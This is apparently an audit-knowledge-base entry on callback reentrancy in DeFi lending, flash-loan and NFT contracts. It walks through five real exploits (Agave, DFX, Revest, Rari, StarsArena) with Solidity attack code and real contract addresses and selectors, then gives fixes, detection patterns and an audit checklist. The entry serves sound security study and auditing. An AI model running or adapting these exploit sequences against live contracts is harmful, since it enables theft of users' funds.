---
# Core Classification
protocol: "lending, defi, nft"
chain: "ethereum, gnosis, avalanche, polygon"
category: "reentrancy"
vulnerability_type: "callback_reentrancy"

# Pattern Identity (Required)
root_cause_family: callback_reentrancy
pattern_key: callback_reentrancy | lending_pool | reentrancy | fund_loss

# Interaction Scope
interaction_scope: single_contract

# Attack Vector Details
attack_type: "reentrancy"
affected_component: "lending_pool, flash_loan, nft_mint, share_trading"

# Technical Primitives
primitives:
  - "erc677_onTokenTransfer"
  - "erc1155_onERC1155Received"
  - "native_eth_receive"
  - "flash_callback"
  - "reentrancy"
  - "state_inconsistency"
  - "callback_exploitation"
  - "exitMarket"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.8
financial_impact: "critical"

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "FNFT"
  - "mint"
  - "_mint"
  - "flash"
  - "borrow"
  - "address"
  - "deposit"
  - "receive"
  - "fallback"
  - "withdraw"
  - "StarsArena"
  - "exitMarket"
  - "viewDeposit"
  - "borrowTokens"
  - "nonReentrant"
path_keys:
  - "erc_677_ontokentransfer_reentrancy_during_liquidation"
  - "flash_loan_callback_reentrancy_deposit_in_callback"
  - "erc_1155_onerc1155received_reentrancy_during_nft_mint"
  - "native_eth_avax_receive_reentrancy_exitmarket_state_bypass"

# Context Tags
tags:
  - "defi"
  - "reentrancy"
  - "callback"
  - "erc677"
  - "erc1155"
  - "native_eth"
  - "flash_loan"
  - "lending"
  - "aave_fork"
  - "compound_fork"
  - "share_trading"
  - "gnosis_chain"
  - "avalanche"

# Version Info
language: "solidity"
version: ">=0.6.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [AGAVE-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-03/Agave_exp.sol` |
| [DFX-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-11/DFX_exp.sol` |
| [REVEST-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-03/Revest_exp.sol` |
| [RARI-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-04/Rari_exp.sol` |
| [STARS-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-10/StarsArena_exp.sol` |

---

# Callback Reentrancy Patterns — Token Standards & Native Transfers (2022-2023)
## Overview

While classic ETH reentrancy via `receive()` is well-understood, 2022-2023 saw an explosion of **non-obvious callback reentrancy** vectors exploiting token standard callbacks (ERC-677 `onTokenTransfer`, ERC-1155 `onERC1155Received`), flash loan callback mechanisms, and native token transfers on non-Ethereum chains. These attacks caused **$94.5M+** in losses across 5+ major exploits. The common thread: protocol state is partially updated when a callback fires, and the attacker re-enters during the inconsistent state to borrow against not-yet-removed collateral, deposit flash-loaned tokens as liquidity, inflate FNFT values, or circumvent market exit checks.

---


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `callback_reentrancy` |
| Pattern Key | `callback_reentrancy | lending_pool | reentrancy | fund_loss` |
| Severity | CRITICAL |
| Impact | fund_loss |
| Interaction Scope | `single_contract` |
| Chain(s) | ethereum, gnosis, avalanche, polygon |


## 1. ERC-677 `onTokenTransfer` Reentrancy During Liquidation

> **pathShape**: `callback-reentrant`

### Root Cause

This vulnerability exists because Aave V2 forks deployed on chains using ERC-677 bridged tokens (like Gnosis Chain) inherit a callback mechanism not originally accounted for in Aave's design. When the lending protocol burns aTokens to transfer underlying collateral during `liquidationCall()`, the ERC-677 `onTokenTransfer()` callback fires on the recipient BEFORE the liquidation accounting is finalized. The attacker re-enters the lending pool during this callback to borrow against collateral that should have been removed.

### Attack Scenario

1. Attacker creates a position with health factor barely above 1
2. Wait for interest accrual to push health factor below 1
3. Flash loan additional funds, trigger self-liquidation
4. During liquidation, ERC-677 callback fires on collateral transfer
5. In the callback: deposit more collateral, borrow all available assets
6. Liquidation completes, but funds already drained

### Vulnerable Pattern Examples

**Example 1: Agave Finance — ERC-677 onTokenTransfer Reentrancy ($5.5M, March 2022)** [Approx Vulnerability: CRITICAL] `@audit` [AGAVE-POC]

```solidity
// ❌ VULNERABLE: Aave V2 fork on Gnosis Chain uses ERC-677 bridged tokens
// ERC-677 tokens trigger onTokenTransfer() on every transfer
// During liquidationCall(), aToken burn → transfer → callback BEFORE state update

// Attack Step 1: Create near-liquidation position
// Deposit small LINK + WETH as collateral, borrow against them
// Health factor barely above 1.0

// Attack Step 2: Advance time to push health factor below 1
vm.warp(block.timestamp + 3600);  // 1 hour of interest accrual

// Attack Step 3: Flash loan 2728.93 WETH, trigger self-liquidation
lendingPool.liquidationCall(weth, weth, address(this), 2, false);

// Attack Step 4: ERC-677 callback fires during liquidation
function onTokenTransfer(
    address _from, uint256 _value, bytes memory _data
) external {
    if (_from == aweth && _value == 1) {
        callCount++;
        if (callCount == 2) {
            borrowTokens();  // @audit RE-ENTER during stale state!
        }
    }
}

// Attack Step 5: Inside reentrant call — boost collateral, borrow everything
modifier boostLTVHack() {
    // Deposit ALL flash-loaned WETH as collateral
    lendingPool.deposit(weth, WETH.balanceOf(address(this)) - 1,
        address(this), 0);
    _;
    // Then borrow WETH back
    lendingPool.borrow(weth, wethLiqBeforeHack, 2, 0, address(this));
}

function borrowTokens() internal boostLTVHack {
    _borrow(usdc);   // @audit Drain USDC pool
    _borrow(gno);    // @audit Drain GNO pool
    _borrow(link);   // @audit Drain LINK pool
    _borrow(wbtc);   // @audit Drain WBTC pool
    _borrow(wxdai);  // @audit Drain WXDAI pool
    // @audit Total: $5.5M drained from ALL lending pools
}
```

---

## 2. Flash Loan Callback Reentrancy — Deposit-in-Callback

> **pathShape**: `callback-reentrant`

### Root Cause

This vulnerability exists because the flash loan function calls back to the borrower BEFORE verifying that the loan has been repaid. The attacker uses the callback to `deposit()` the flash-loaned tokens as liquidity (receiving LP tokens), which the pool's balance check interprets as "loan repaid." After the flash loan completes, the attacker can withdraw the LP tokens to extract the underlying assets.

### Vulnerable Pattern Examples

**Example 2: DFX Finance — Flash Callback Deposit ($4M, November 2022)** [Approx Vulnerability: CRITICAL] `@audit` [DFX-POC]

```solidity
// ❌ VULNERABLE: flash() calls back BEFORE checking repayment
// Attacker deposits flash-loaned tokens as liquidity in the callback
// Pool balance check passes because tokens are "back" (as liquidity)

interface Curve {
    function flash(address recipient, uint256 amount0, uint256 amount1,
        bytes calldata data) external;
    function viewDeposit(uint256 _deposit) external view
        returns (uint256, uint256[] memory);
    function deposit(uint256 _deposit, uint256 _deadline) external
        returns (uint256, uint256[] memory);
    function withdraw(uint256 _curvesToBurn, uint256 _deadline) external;
}

// Attack Step 1: Calculate deposit amounts
uint256[] memory XIDR_USDC = new uint256[](2);
XIDR_USDC[0] = 0;
XIDR_USDC[1] = 0;
(, XIDR_USDC) = dfx.viewDeposit(200_000 * 1e18);

// Attack Step 2: Flash loan 99.5% of those amounts
dfx.flash(
    address(this),
    XIDR_USDC[0] * 995 / 1000,
    XIDR_USDC[1] * 995 / 1000,
    new bytes(1)
);

// Attack Step 3: In the flash callback — DEPOSIT as liquidity!
function flashCallback(
    uint256 fee0, uint256 fee1, bytes calldata data
) external {
    // @audit Deposit flash-loaned tokens as liquidity
    (receiption,) = dfx.deposit(200_000 * 1e18, block.timestamp + 60);
    // Pool receives tokens → balance check passes → flash loan "repaid"
    // But attacker now holds LP tokens worth the same amount!
}

// Attack Step 4: After flash completes, withdraw LP for profit
dfx.withdraw(receiption, block.timestamp + 60);
// @audit Got back underlying tokens + any fees/slippage profit
// Net effect: attacker extracted value from the pool
```

---

## 3. ERC-1155 `onERC1155Received` Reentrancy During NFT Mint

> **pathShape**: `callback-reentrant`

### Root Cause

This vulnerability exists because ERC-1155 token transfers trigger `onERC1155Received()` callbacks on the recipient. When a protocol mints ERC-1155 tokens (like Financial NFTs), the callback fires during the minting process BEFORE the mint's accounting state is finalized. The attacker uses this callback to call `depositAdditionalToFNFT()` which modifies the per-unit deposit value, inflating the value of all subsequently minted tokens.

### Vulnerable Pattern Examples

**Example 3: Revest Finance — ERC-1155 onERC1155Received During FNFT Mint ($2M, March 2022)** [Approx Vulnerability: CRITICAL] `@audit` [REVEST-POC]

```solidity
// ❌ VULNERABLE: ERC-1155 mint triggers onERC1155Received callback
// During FNFT minting, attacker re-enters to deposit additional tokens
// This inflates per-unit value for ALL tokens in the FNFT series

// Attack Step 1: Flash loan 5 RENA tokens
// (flash loan from Uniswap V2)

// Attack Step 2: Mint FNFT #1 with quantity=2, depositAmount=0
fnftId = revest.mintAddressLock(
    address(this), new bytes(0), recipients, quantities, fnftConfig
);
// quantities[0] = 2, fnftConfig.depositAmount = 0

// Attack Step 3: Mint FNFT #2 with quantity=360,000
quantities[0] = uint256(360_000);
revest.mintAddressLock(
    address(this), new bytes(0), recipients, quantities, fnftConfig
);
// During this mint, ERC-1155 mints 360,000 tokens to attacker contract

// Attack Step 4: ERC-1155 callback fires during FNFT #2 mint
function onERC1155Received(
    address operator, address from, uint256 id,
    uint256 value, bytes calldata data
) public returns (bytes4) {
    if (id == fnftId + 1 && !reentered) {
        reentered = true;
        // @audit RE-ENTER: Deposit 1e18 RENA to FNFT #1
        // But this sets per-unit value based on small FNFT #1 (qty=2)
        revest.depositAdditionalToFNFT(fnftId, 1e18, 1);
        // @audit The per-unit value is now 1e18 / 2 = 5e17 per unit
        // But FNFT #2 has 360,000 units that will also read this value!
    }
    return this.onERC1155Received.selector;
}

// Attack Step 5: Withdraw from FNFT #2 at inflated per-unit value
revest.withdrawFNFT(fnftId + 1, 360_000 + 1);
// @audit Withdraws 360,001 * (inflated per-unit value) RENA tokens
// Actual deposit: 1e18 RENA → Withdrawn: 360,001 * 5e17 = 180,000 RENA
// Massive profit: repay 5 RENA flash loan, keep ~$2M worth of RENA
```

---

## 4. Native ETH/AVAX `receive()` Reentrancy — exitMarket/State Bypass

> **pathShape**: `callback-reentrant`

### Root Cause

This vulnerability exists because native token transfers (ETH, AVAX) trigger the recipient's `receive()` or `fallback()` function. In Compound-fork lending protocols, `borrow()` sends native ETH before fully updating the borrow state. The attacker uses the `receive()` callback to call `exitMarket()`, removing their collateral from the market BEFORE the borrow is recorded. They then redeem their "freed" collateral while keeping the borrowed funds.

### Vulnerable Pattern Examples

**Example 4: Rari Capital / Fuse Pool 127 — Native ETH exitMarket Reentrancy ($80M, April 2022)** [Approx Vulnerability: CRITICAL] `@audit` [RARI-POC]

```solidity
// ❌ VULNERABLE: Compound fork sends ETH during borrow()
// ETH transfer triggers receive() BEFORE borrow state is fully updated
// Attacker calls exitMarket() in receive() to "free" collateral

// Attack Step 1: Flash loan 150M USDC from Balancer
IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
vault.flashLoan(address(this), tokens, amounts, "");

// Attack Step 2: Deposit USDC as collateral
usdc.approve(address(fusdc_127), type(uint256).max);
fusdc_127.mint(15_000_000_000_000);  // Mint fUSDC tokens

// Attack Step 3: Enter USDC market as collateral
address[] memory ctokens = new address[](1);
ctokens[0] = address(fusdc_127);
rari_Comptroller.enterMarkets(ctokens);

// Attack Step 4: Borrow ETH — triggers receive()
fETH_127.borrow(1977 ether);
// @audit ETH sent to attacker BEFORE borrow fully recorded

// Attack Step 5: REENTRANCY in receive() — exit market!
receive() external payable {
    rari_Comptroller.exitMarket(address(fusdc_127));
    // @audit Collateral is now "freed" — not counted as backing the borrow
    // Because the borrow state hasn't been fully updated yet
}

// Attack Step 6: Redeem the "freed" collateral
fusdc_127.redeemUnderlying(15_000_000_000_000);
// @audit Gets back ALL 15B USDC — collateral was "freed" by exitMarket
// Attacker has: 15B USDC (from redeem) + 1977 ETH (from borrow)

// Attack Step 7: Repay flash loan, keep ETH as profit
usdc.transfer(address(vault), usdc_balance);
// @audit ~$80M total across multiple Fuse pools using same technique
```

**Example 5: StarsArena — Native AVAX Reentrancy in Share Selling ($3M, October 2023)** [Approx Vulnerability: CRITICAL] `@audit` [STARS-POC]

```solidity
// ❌ VULNERABLE: StarsArena sends AVAX during share operations
// Native AVAX transfer triggers receive() → attacker re-enters
// Unverified source contract on Avalanche

address private constant victimContract =
    0xA481B139a1A654cA19d2074F174f17D7534e8CeC;
bool private reenter = true;

// Attack Step 1: Buy shares (1 AVAX) — selector 0xe9ccf3a3
(bool success,) = victimContract.call{value: 1 ether}(
    abi.encodeWithSelector(
        bytes4(0xe9ccf3a3),  // buyShares or similar function
        address(this), true, address(this)
    )
);

// Attack Step 2: Sell shares — triggers AVAX refund → receive()
(bool success2,) = victimContract.call(
    abi.encodeWithSignature(
        "sellShares(address,uint256)", address(this), 1
    )
);

// Attack Step 3: Reentrancy in receive() — manipulate pricing
receive() external payable {
    if (reenter == true) {
        // @audit Re-enter with selector 0x5632b2e4
        // Sets price parameters to 91 Gwei (extremely inflated)
        (bool success,) = victimContract.call(
            abi.encodeWithSelector(
                bytes4(0x5632b2e4),
                91e9, 91e9, 91e9, 91e9
                // @audit Inflates share pricing during stale state
            )
        );
        reenter = false;
    }
}
// @audit Total loss: ~$3M from StarsArena on Avalanche
```

---

## Impact Analysis

### Technical Impact
- Complete drainage of lending pool assets across ALL markets (Agave, Rari)
- Free extraction of LP value without actual deposit costs (DFX)
- Inflation of FNFT values by orders of magnitude (Revest)
- Bypass of collateral requirements via exitMarket during inconsistent state (Rari)
- Share price manipulation via reentrancy (StarsArena)

### Business Impact
- **Total losses 2022-2023:** $94.5M+ (Rari $80M, Agave $5.5M, DFX $4M, StarsArena $3M, Revest $2M)
- Compound forks and Aave forks are systematically vulnerable to non-standard callback vectors
- Impact amplified on non-Ethereum chains with ERC-677 bridged tokens (Gnosis, xDai)
- Social trading platforms (StarsArena/friend.tech clones) lack basic reentrancy protection

### Affected Scenarios
- Aave V2 forks on chains with ERC-677 bridged tokens (Gnosis, Polygon, BSC)
- Compound forks with native ETH/AVAX markets (cETH, fETH)
- DEXes with flash loan callbacks that don't use reentrancy guards
- NFT/FNFT protocols minting ERC-1155 tokens during state transitions
- Social trading contracts sending native tokens during buy/sell operations
- Any protocol where token transfer triggers a callback during partial state update

---

## Secure Implementation

**Fix 1: Reentrancy Guard on All State-Changing Functions**
```solidity
// ✅ SECURE: ReentrancyGuard prevents all callback exploitation
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureLending is ReentrancyGuard {
    function borrow(uint256 amount) external nonReentrant {
        // Update state BEFORE external calls
        borrows[msg.sender] += amount;
        totalBorrows += amount;

        // Now safe to transfer (callback cannot re-enter)
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }

    function liquidationCall(...) external nonReentrant {
        // Full state update before any transfers
        _updateLiquidationState(borrower, collateralAsset, debtAsset, amount);

        // Transfer collateral — callback cannot re-enter
        IERC20(collateralAsset).safeTransfer(liquidator, collateralAmount);
    }
}
```

**Fix 2: Checks-Effects-Interactions Pattern for Flash Loans**
```solidity
// ✅ SECURE: Record pre-flash state, verify AFTER callback
contract SecureFlashLoan {
    function flash(address recipient, uint256 amount0, uint256 amount1,
        bytes calldata data) external nonReentrant {
        uint256 preBalance0 = token0.balanceOf(address(this));
        uint256 preBalance1 = token1.balanceOf(address(this));

        // Transfer tokens
        token0.safeTransfer(recipient, amount0);
        token1.safeTransfer(recipient, amount1);

        // Callback
        IFlashCallback(recipient).flashCallback(fee0, fee1, data);

        // STRICT repayment check — must receive EXACT amount + fee back
        // Cannot be satisfied by depositing as liquidity
        require(
            token0.balanceOf(address(this)) >= preBalance0 + fee0,
            "Flash: insufficient token0 repayment"
        );
        require(
            token1.balanceOf(address(this)) >= preBalance1 + fee1,
            "Flash: insufficient token1 repayment"
        );

        // Block deposit during flash
        require(!_flashActive, "Cannot deposit during flash");
    }

    function deposit(...) external {
        require(!_flashActive, "Cannot deposit during flash");
        // ...
    }
}
```

**Fix 3: Callback-Aware ERC-1155 Minting**
```solidity
// ✅ SECURE: Complete ALL state updates before ERC-1155 mint
contract SecureFNFT is ReentrancyGuard {
    function mintAddressLock(...) external nonReentrant returns (uint256) {
        uint256 fnftId = _getNextFNFTId();

        // EFFECTS: Set ALL state BEFORE minting (which triggers callback)
        fnftConfigs[fnftId] = config;
        fnftValues[fnftId] = depositAmount;
        fnftQuantities[fnftId] = quantity;
        _lockFNFT(fnftId);

        // INTERACTIONS: Now safe to mint (callback cannot corrupt state)
        _mint(recipient, fnftId, quantity, "");

        return fnftId;
    }

    // Additional: lock deposit functions during mint
    function depositAdditional(uint256 fnftId, uint256 amount, uint256 quantity)
        external nonReentrant {
        require(!_minting, "Cannot deposit during mint");
        // ...
    }
}
```

---

## Detection Patterns

### Code Patterns to Look For
```
- Transfer of native ETH/AVAX before borrow state update → classic reentrancy
- ERC-677 tokens used as collateral/underlying → onTokenTransfer callback
- ERC-1155 minting during state transition → onERC1155Received callback
- Flash loan callback without reentrancy guard → flashCallback exploitation
- exitMarket()/redeemUnderlying() callable in same context as borrow → state bypass
- Missing nonReentrant modifier on borrow/liquidation/mint functions
- Aave/Compound forks deployed on non-Ethereum chains → bridge token callbacks
- deposit() callable during flash() callback → deposit-as-repayment
- sellShares/buyShares without reentrancy guard → native token callback
```

### Audit Checklist
- [ ] Are all external calls (transfers) made AFTER state updates?
- [ ] Is `nonReentrant` modifier on ALL state-changing functions?
- [ ] Do bridged tokens on this chain support ERC-677 callbacks?
- [ ] Can `deposit()` or `mint()` be called during a flash loan callback?
- [ ] Can `exitMarket()` be called during a borrow's ETH transfer callback?
- [ ] Are ERC-1155 mint callbacks happening before state finalization?
- [ ] Is flash loan repayment verified by balance diff (not just balance check)?
- [ ] Are native token sends followed by external-call-vulnerable state reads?
- [ ] Has the protocol been audited for non-standard token callback vectors?

---

## Real-World Examples

### Known Exploits
- **Rari Capital (Fuse Pool 127)** — Native ETH receive() → exitMarket during borrow, Ethereum — April 2022 — $80M
  - Root cause: ETH sent before borrow state update; exitMarket called in receive() to free collateral
- **Agave Finance** — ERC-677 onTokenTransfer during liquidation on Gnosis Chain — March 2022 — $5.5M
  - Root cause: Aave V2 fork didn't account for ERC-677 callbacks on bridged tokens
- **DFX Finance** — Flash callback used to deposit borrowed tokens as liquidity — November 2022 — $4M
  - Root cause: flash() checked balance after callback; deposit satisfied the check
- **StarsArena** — Native AVAX receive() reentrancy on share sell — October 2023 — $3M
  - Root cause: No reentrancy guard on share trading functions, AVAX sent before state update
- **Revest Finance** — ERC-1155 onERC1155Received during FNFT mint — March 2022 — $2M
  - Root cause: Callback during mint allowed depositAdditionalToFNFT call, inflating per-unit value

---

## Prevention Guidelines

### Development Best Practices
1. Use `ReentrancyGuard.nonReentrant` on ALL functions that involve external calls
2. Follow strict Checks-Effects-Interactions: update ALL state before ANY transfer
3. When forking Aave/Compound for non-Ethereum chains, audit ALL bridged token callback mechanisms
4. Block deposit/mint operations during flash loan execution
5. Verify flash loan repayment via balance delta, not absolute balance
6. Lock `exitMarket()` during borrow execution (same-tx lock)
7. For ERC-1155 protocols: complete ALL accounting before `_mint()` calls
8. Add cross-function reentrancy locks (shared lock across related functions)
9. Test for reentrancy on every chain where the protocol is deployed — callback mechanisms vary

### Testing Requirements
- Unit tests for: ERC-677 callback reentrancy, ERC-1155 callback reentrancy, ETH receive() reentrancy
- Integration tests for: full attack flow with flash loans + callbacks
- Fuzzing targets: all functions that perform external calls with random callback behavior
- Invariant tests: total borrows should never exceed total collateral value after any operation
- Chain-specific tests: test with actual bridged tokens on target chain (not just Ethereum ERC-20s)

---

## Keywords for Search

> `callback reentrancy`, `onTokenTransfer`, `ERC-677`, `onERC1155Received`, `ERC-1155 reentrancy`, `receive reentrancy`, `fallback reentrancy`, `flash callback reentrancy`, `exitMarket reentrancy`, `native ETH reentrancy`, `AVAX reentrancy`, `Agave Finance`, `DFX Finance`, `Revest Finance`, `Rari Capital`, `StarsArena`, `Fuse Pool`, `Compound fork`, `Aave fork`, `deposit in callback`, `flash loan callback`, `token callback`, `bridged token`, `Gnosis Chain`, `checks-effects-interactions`, `cross-function reentrancy`, `FNFT`, `share trading`

---

## Related Vulnerabilities

- `DB/general/reentrancy/defihacklabs-reentrancy-patterns.md` — 2021 basic reentrancy patterns
- `DB/general/reentrancy/defihacklabs-readonly-reentrancy-patterns.md` — Read-only reentrancy (Curve/Balancer)
- `DB/general/flash-loan/` — Flash loan attack patterns
- `DB/general/business-logic/defihacklabs-solvency-business-logic-patterns.md` — Solvency check bypasses
